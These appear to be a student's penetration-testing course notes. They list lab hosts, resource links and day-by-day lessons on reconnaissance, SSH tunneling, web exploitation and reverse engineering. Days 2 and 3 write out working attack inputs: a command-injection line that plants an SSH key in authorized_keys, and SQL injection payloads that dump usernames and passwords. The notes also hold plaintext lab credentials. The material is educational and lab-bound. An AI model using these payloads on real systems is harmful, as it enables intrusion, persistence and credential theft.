https://sec.cybbh.io/public/security/latest/index.html
CTF address (http://10.50.20.250:8000)
Occupational field resources
WIN-OPS - 10.50.43.194
LIN-OPS - 10.50.37.61
----
DarkNetDiaries - Podcast
Operation Glowing Symphony


-------------------
Username - CRWA-M-507
Password - qDRhLlXvXTqUjP5
IP - 10.50.37.139

Bonestroo - 10.50.26.30
Johannsen - 10.50.47.112
Bage - 10.50.40.200

Lewis
Username - GALE-M-507
Password - iv4CRgEPySw8bJM
IP - 10.50.44.245

##################################################################################
##################################################################################
#####                                                                        #####
#####                           Lesson Resources                             #####
#####                                                                        #####
##################################################################################
##################################################################################


Penetration Testing
---------------------
Report Example 1 - https://www.offsec.com/reports/sample-penetration-testing-report.pdf
Report Example 2 - https://tbgsecurity.com/wordpress/wp-content/uploads/2016/11/Sample-Penetration-Test-Report.pdf

Network Reconnaissance
--------------------
Nmap NSE - https://nmap.org/book/nse.html
Nmap NSE Scripts (Github) - https://github.com/nmap/nmap/tree/master/scripts
Scrapin gwith Python lxml - https://blog.datahut.co/beginners-guide-to-web-scraping-with-python-lxml/
Scraping with Python - https://docs.python-guide.org/scenarios/scrape/
Wireshark Display Filters - http://packetlife.net/media/library/13/Wireshark_Display_Filters.pdf

Exploit Research
--------------------
Exploit Research Report Template - https://git.cybbh.space/sec/public/raw/master/security/activities/03-activity-exploit-pairing/Exploit_research-report-template.docx
Exploit-DB - https://www.exploit-db.com/

Web Exploitation
-------------------
W3schools SQL UNION - https://www.w3schools.com/sql/sql_union.asp
SQLbolt Practice - https://sqlbolt.com/
OWASP XSS Attacks - https://owasp.org/www-community/attacks/xss/
Amolnaik blog INSERT Injection - http://amolnaik4.blogspot.com/2012/02/sql-injection-in-insert-query.html
Pentestmonkey SQL cheat sheet - http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
Netsparker SQL cheat sheet - https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
Mozilla Developer Console - https://developer.mozilla.org/en-US/docs/Tools/Browser_Console
Chrome Developer Console - https://developers.google.com/web/tools/chrome-devtools/console/
HTTP - https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol
AJAX Security - https://www.owasp.org/index.php/AJAX_Security_Cheat_Sheet
Cross-Site Scripting-PHP & Cookies - https://null-byte.wonderhowto.com/how-to/write-xss-cookie-stealer-javascript-steal-passwords-0180833/
Filter Evasion - https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
XSS Prevention - https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet
XSS PreventionFile Upload Vulnerability - https://www.owasp.org/index.php/Unrestricted_File_Upload
Arbitrary File Upload - https://teambi0s.gitlab.io/bi0s-wiki/web/file-upload/
Command Injection - https://www.owasp.org/index.php/Command_Injection
PHP web shell introduction - https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/
Comprehensive tutorial on cross-site scripting - https://excess-xss.com/

Reverse Engineering
--------------------
Reverse Engineering Workflow - https://git.cybbh.space/sec/public/-/jobs/artifacts/master/raw/guides/Reverse_engineering_workflow.pdf?job=genpdf
x86 Student Guide - https://git.cybbh.space/sec/public/-/jobs/artifacts/master/raw/guides/x86_guide.pdf?job=genpdf
GDB Student Guide - http://10.50.20.250:8000/files/4590e117a1dc6559af667eaf509fb91c/GDB_student_guide.pdf
Ghidra Guide - http://10.50.20.250:8000/files/0c8520ac1e713e98f1881d73e5ac50a2/Ghidra_student_guide.pdf
IDA Overview - http://10.50.20.250:8000/files/619b9381e3d4fb1613a417f521a930ef/IDA_Overview.pdf
Memory Diagram - http://10.50.20.250:8000/files/8311b059c4dd857affccd47f6d89758a/memoryLayoutC.jpg
Registers Diagram - http://10.50.20.250:8000/files/fileimports/RegistersDiagram.pdf
Stack Practice - http://10.50.20.250:8000/files/fileimports/Stack_practice.pdf
Intel Manual - https://software.intel.com/sites/default/files/managed/39/c5/325462-sdm-vol-1-2abcd-3abcd.pdf
The Stack - https://eli.thegreenplace.net/2011/02/04/where-the-top-of-the-stack-is-on-x86/
OpenJDK11 - https://download.java.net/java/GA/jdk11/9/GPL/openjdk-11.0.2_windows-x64_bin.zip
Demo1.c - http://10.50.20.250:8000/files/5f7396c7ef355a19d99d94fbe178de04/demo_new.c
Demo1.exe - http://10.50.20.250:8000/files/d95014f62a0e81270f07cf170c70ddf7/demo1_new.exe
Demo2.c - http://10.50.20.250:8000/files/a5a8c6a38aaa65c7c76357311f32b470/demo2_new.c
Demo2.exe - http://10.50.20.250:8000/files/f93306b3b1e5fac8c8836536070d3ca5/demo2_new.exe
Demo3.c - http://10.50.20.250:8000/files/8781fd7d5b631217c4e35fbceee2ffae/demo10.c
Demo3.exe - http://10.50.20.250:8000/files/7d6cf3098d7230a69be668bf6674f24a/demo10.exe
Hmmm - http://10.50.20.250:8000/files/c5a854fe82abc7c56010cd12e090292d/Hmmm
Hmmm.exe - http://10.50.20.250:8000/files/adfe4af3511da055a4833ba05c304923/Hmmm.exe
HotCold - http://10.50.20.250:8000/files/948da94ea348a43cf44be4201a06dd33/HotCold

Exploit Development
---------------------
func demo - http://10.50.20.250:8000/files/b685b81a95c3eb3cf83f211416b63156/func
ASM Geometry - https://hovav.net/ucsd/dist/geometry.pdf
POC||GTFO - https://www.alchemistowl.org/pocorgtfo/
Phrack - http://www.phrack.org/
ROP FTW - https://www.exploit-db.com/docs/english/28479-return-oriented-programming-(rop-ftw).pdf
Remote Buffer Overflor Methodology - http://10.50.20.250:8000/files/6698b44bd64f8c21874e4dd609952375/Remote_Overflow.py
Pattern_manager.py - http://10.50.20.250:8000/files/4df6b211b91f1aed2154b54bace0726d/patternmanager.py
Local Buffer OVerflow Methodology - http://10.50.20.250:8000/files/a0498670d52c5544f616cc14657c07e5/Local_Overflow.py
cibo - http://10.50.20.250:8000/files/42e8530f5fe6ccea3d077541682f28df/cibo
figureitout - http://10.50.20.250:8000/files/b14c5a9c825de98951160f491ea244ad/figureitout
build-exploit-linu-traditional.sh - http://10.50.20.250:8000/files/acb185c7b0c660916581ff768323ca4d/build-exploit-linux-traditional.sh
IamVulnerable.exe - http://10.50.20.250:8000/files/8b825a963e5422928c4c5fd666cde5c4/IamVulnerable.exe
libgcc_s_dw2-1.dll - http://10.50.20.250:8000/files/8ac3cfd1d1f536422b92942163a52448/libgcc_s_dw2-1.dll
Windows Buffer OVerflow - https://z3r0th.medium.com/a-simple-buffer-overflow-using-vulnserver-86b011eb673b

Post Exploitation
---------------------
Multiplexing - https://en.wikibooks.org/wiki/OpenSSH/Cookbook/Multiplexing
Tunneling - https://en.wikibooks.org/wiki/OpenSSH/Cookbook/Tunnels
Explain Shell - https://explainshell.com/

Windows Specific Topics
---------------------
User vs. Kernel - https://en.wikibooks.org/wiki/Windows_Programming/User_Mode_vs_Kernel_Mode
Access Control Module - https://docs.microsoft.com/en-us/windows/desktop/secauthz/access-control-components
UAC Bypass - https://www.greyhathacker.net/?p=796
MITRE Persistence - https://attack.mitre.org/tactics/TA0003/
PowerSploit - https://github.com/PowerShellMafia/PowerSploit
UAC Information - https://blog.cobaltstrike.com/2014/03/20/user-account-control-what-penetration-testers-should-know/
Windows Security Log Events - https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/default.aspx
Windows DLL hijacking walkthrough - https://medium.com/techzap/dll-hijacking-part-1-basics-b6dfb8260cf1
Windows Putty.exe - http://10.50.20.250:8000/files/1fe32d79e64bfad384d8f6f4ae6cd5cf/putty.exe

Linux Specific Topics
--------------------
Linux Priv Esc Repo - https://gtfobins.github.io/
Rsyslog Wiki - https://wiki.gentoo.org/wiki/Rsyslog
Rsyslog Additional Help - https://www.the-art-of-web.com/system/rsyslog-config/

##################################################################################
##################################################################################
#####                                                                        #####
#####                           Lesson Resources                             #####
#####                                                                        #####
##################################################################################
##################################################################################

$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$    Day 1    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

Penetration Testing
-------------------
Phase 1 - Mission Definition
Employer will set up the guidelines for the mission (what is off limits and what is not, how to get to the objective if given the information)

Phase 2 - Recon
Passive Reconnaissance about the target (Google Dorking, tcpdump, nslookup)

Phase 3 - Footprinting
Gathering data about the target through scanning

Phase 4 - Exploitation and Initial Access

Phase 5 - Post-Exploitation
Establishing persistence (runkeys, accounts, services)
Escalate privileges (root, most times not root and using sudo instead)
Cover your tracks
Exfiltrate target data

Phase 6 - Document Mission
Document and report mission details

Penetration Test Reporting
------------------
Reasons to report - report when access is gained and when access is denied
What to report - report the good and bad, everything
Screen captures - describe screen captures

Scanning and Reconnaisance
-------------------
If a port is open verify the service
Using nmap and nc for banner grabbing

Open Source Intelligence
----
Appropriate Documentation Practices
Use of Collected Data
Collection Methods

Documentation
----
Why is it important?
What should we include in documentation?

Collection and Use
----
What do we want to collect?
How can it be used in operations?

Limitations on Collection
----
Are there rules that guide our operations and collection parameters?
What are important factors when collection data about a target?

Data to Collect
----
Web Data
  Cached Content, Analytics, Proxy Web Application, Command Line Interrogation
Sensitive Data
  Business Data, Profiles, Non-Profits/Charities, Business Filings, Hostorical and Public Listings
Publicly Accessible
  Physical Addresses, Phone Numbers, Email Addresses, User Names, Search Engine Data, Web and Traffic Cameras, Wireless Access Point Data
Social Media
  Twitter, Facebook, Instagram, People Searches, Registry and Wish Lists
Domain and IP Data
  DNS Registration, IP Address Assignments, Geolocation Data, Whois

Hyper-Text Markup Language (HTML)
----
Standardized markup language for browser interpretation of webpages
  Client-side interpretation (web browser)
  Utilizes elements (identified by tags)
  Typically redirects to another page for server-side interaction
  Cascading Sytlesheets (CSS) for page themeing

DOCTYPE declares what type of document

Scraping
----
Data prep
(pip install lxml requests)

#!/usr/bin/python
import lxml.html
import requests
                            ##Webpage
page = requests.get('http://quotes.toscrape.com') ##<- webpage goes here ->
tree = lxml.html.fromstring(page.content)      ##Library for processing SML and HTML in the Python language

authors = tree.xpath('//small[@class="author"]/text()')    ## Xpath Query filter for Small Tags, where class is authors

print ('Authors: ',authors)

Advanced Scanning techniques
-----------------------
Host Discovery
  Find hosts that are online
Port Enumeration
  Find ports for each host that is online
Port Interrogation
  Find what service is running on each open/available port

Host discovery methods
----
Ping sweep, nmap

Port Enumeration
----
nc or nmap

Port Interrogation
----
nc or nmap

nikto -h <IP> -p <port>

NMAP Scripting Engine
-------------------
Benefits of scanning with scripts
Script management and Utilization
Usage and Examples

/usr/share/nmap/scripts

Good scripts for class
----
banner.nse
http-enum.nse

nmap --script=http.enum.nse <IP>

Main benefits
----
Network discovery
Sophisticated Version Detection
Vulnerability Detection
Backdoor detection
Vulnerability Exploitation

Master Sockets
------------------
ssh -MS /tmp/<filename> student@<IP> -O cancel (-M master -S socket/slave)

ssh -S /tmp/<same file> <random words> -O forward -L<RHP>:<IP>:22

ssh student@127.0.0.1 -p 2222

ssh -S /tmp/<file> <random text> -O forward -D9050

1. ssh -MS /tmp/<file> student@<initial jump>
2. ssh -S /tmp/<file> <random text> -O forward -L2222:<IP>:22 -L2223:<additional IP>:<port> -L2224:<additional IP>:<port> (can set up all tunnels in one command)
3. ssh -MS /tmp/<target file> <username>@127.0.0.1 -p 2222(travels through the first Master Socket through the socket to the next box creating a master socket on the next box)
4. ssh -S /tmp/<target file> <random text> -O forward -D9050 (proxychains will now work on the second hop, the final target computer)

$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$    Day 2    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
Exploitation and Vulnerability Research
---------------------
Vulnerability Research
----
Offensive
--
Used to find known exploits so that you dont have to come up with your own exploit for something that has already been exploited

Defensive
--
Used to defend your network from exploits that are known

When researching vulnerabilities, make sure that a reputable website/source is being used for the research

Initial access
----
The first time a system is accessed and how it was accessed

Web Exploitation
-----------------
HTTP Response Codes
----
10X==Informational
2XX==Success
30X==Redirection
4XX==Client Error
5XX==Server Error

Enumeration
----
Legitimate surfing
Tools:
  NSE Scripts
  Nikto
  Burp suite (outside of class)

--script=http-enum.nse

Robots.txt will tell what pages are available to you and which are not accessible

ROBOTS.TXT WILL HELP WITH TEST

Cross-Site Scripting(XSS)
----
For Cross-Site Scripting you need a secure server that will send a false request back to the client

Reflected XSS
----
Most common form
Trasnient, occurs in error messages or search results
Delivered through intermediate media, such as a link in an email
Characters that are normally illegal in URLs can be Base64 encoded

Stored XSS
----
Resides on vulnerable site
Only requires user to visit page

Useful JavaScript Components
----
Proof of concept
Capturing cookies
Capturing keystrokes
Capturing sensitive data

/var/www/html

Command injection
----
can use search boxes on server sites to run commands that the server should not allow you to run

Generating and uploading a public ssh key
----
ls -la /var/www
mkdir /var/www/.ssh (if .ssh does not exist on server)
rm -rf .ssh (remove ssh keys to generate a new one)
ssh-keygen -t rsa -b 4096 (generates ssh key)
id_rsa = private key
id_rsa.pub = public key
cat id_rsa.pub 
GRAB ALL OF THE TEXT AND ADD IT TO A NEW FILE 
; echo "<text>" > /var/www/.ssh/authorized_keys
(copy and paste into box on server to gain access)
Verification
--
cat /var/www/.ssh/authorized_keys
ssh -i id_rsa <username>@<IP> of server that just added workstation to the server

10.100.28.40 potential password - YourTempPassword

$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$    Day 3    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

SQL Injection
----
database - repository that holds information, similar to an excel document

Structured Query Language - ANSI Standard

Standard Commands
----
SELECT    Extracts data from a database
UNION    Used to combine the result-set of two or more SELECT statements
USE    Selects the DB to use
UPDATE    Updates data in a database
DELETE    Deletes data from a database
INSERT INTO    Inserts new data into a database
CREATE DATABASE    Creates a new database
ALTER DATABASE    Modifies a database
CREATE TABLE    Creates a new table
ALTER TABLE    Modifies a table
DROP TABLE    Deletes a table
CREATE INDEX    Creates an index (search key)
DROP INDEX    Deletes an index

End commands with a ;
Examples commands
----
SHOW tables;
SHOW TABLES FROM session; (session is database)
SHOW COLUMNS FROM session.Tires; (Tires is table inside database)
SELECT tireid,name,size,cost FROM session.Tires (output is put into the order set up in the command)
***************SELECT column,column,column FROM Database.Table;***************
SELECT color,year,name FROM session.car UNION SELECT name,size,cost FROM session.Tires (puts the information from both tables and adds them into the same table)
UNION must have the same amount of columns selected in order for the commands to work
Can use any number to populate empty columns that are needed to properly run the command

SQL Injection
----
Requires Valid SQL Queries
Fully patched systems can be vulnerable due to misconfiguration
Input Field Sanitization
String vs Integer Values
Is INFORMATION_SCHEMA Database available?
GET Request versus POST Request HTTP methods (Results may vary when using GET compared to POST)

INFORMATION_SCHEMA has information about all of the databases

Unsanitized vs sanitized
----
Unsanitized is not checked for potentially harmful information
Sanitized is checked



##################################################################################
##################################################################################
#####                                                                        #####
#####          Finding Usernames and Passwords using SQL Injection           #####
#####                                                                        #####
##################################################################################
##################################################################################


select id from users where name = '$name' and pass = '$pass'
select id from users where name = 'tom' or 1='1' and pass = 'tom' or 1='1';
when the server doesnt know how to handle the information that it was given when it was not supposed to work it dumps all of the IDs on the system

POST Method
----
Audi' UNION 1,2,3,4,5 ;#
Audi' UNION select table_schema,2,table_name,column_name,5 from information_schema.columns ;# (decide placeholders based on output of the original correct POST request command)
table_schema = databases
table_name = tables
column_name = columns

Audi' UNION select id,2,name,pass,5 from session.user ;#

GET Method
----
http://10.50.35.75/uniondemo.php?Selection=2 or 1=1#
http://10.50.35.75/uniondemo.php?Selection=2 UNION select 1,3,2#
http://10.50.35.75/uniondemo.php?Selection=2 UNION select table_schema,column_name,table_name from information_schema.columns#
http://10.50.35.75/uniondemo.php?Selection=2 UNION select id,pass,name from session.user#
http://10.50.35.75/uniondemo.php?Selection=2 UNION select cost,year,color from session.car UNION select type,carid,name from session.car#
http://10.50.35.75/uniondemo.php?Selection=2 UNION select 1,3,@@version# (shows the version of the SQL server)



##################################################################################
##################################################################################
#####                                                                        #####
#####          Finding Usernames and Passwords using SQL Injection           #####
#####                                                                        #####
##################################################################################
##################################################################################

$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$    Day 4    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

Reverse Engineering
----------------------
%rax    the first return register

%rbp    the base pointer that keeps track of the base of the stack

%rsp    the stack pointer that points to the top of the stack

[%ebp-0x8] = 16 bit base pointer

HEAP - Memory that can be allocated and deallocated
STACK - A contiguous section of memory used for passing arguments
GENERAL REGISTER - A multipurpose register that can be used by either programmer or user to store data or a memory location address
CONTROL REGISTER - A processor register that changes or controls the behavior of a CPU
FLAGS REGISTER - Contains the current state of the processor

LEA = MOV
MOV - move
PUSH - push
POP - pop the top
CMP - compare
JMP- jump
JLE - jump if less than or equal
JE - Jump if equal
JNZ - jump if not zero

Malware Analysis Software
-------------------------
Static - strings
Behavorial - launch the malware
Dynamic - gdb
Disassembly - ghidra
Document Findings - make a document of what you have done

Patching/Software Analysis
--------------------------
Chainging the assembly instructions to do what you want

Param_1 in Ghidra almost always means that it is user input

92+138+184+230+276+322++368+414+460+506























